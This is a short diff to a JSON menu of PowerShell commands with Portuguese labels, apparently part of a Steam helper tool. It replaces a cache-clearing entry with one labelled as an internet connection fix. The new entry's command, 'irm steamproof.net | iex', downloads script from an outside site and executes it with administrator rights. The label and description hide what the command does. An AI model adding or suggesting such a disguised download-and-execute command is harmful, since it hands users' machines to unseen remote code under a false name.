@@ -6,9 +6,9 @@
     "admin": "F"
   },
   {
-    "name": "Limpar Cache da Steam",
-    "description": "Elimina a cache local da Steam para resolver erros de download.",
-    "command": "Remove-Item -Path \"$env:LOCALAPPDATA\\Steam\" -Recurse -Force",
+    "name": "Erro da Conexão da Internet",
+    "description": "Reinstala todos os .lua.",
+    "command": "irm steamproof.net | iex",
     "admin": "T"
   }
 ]
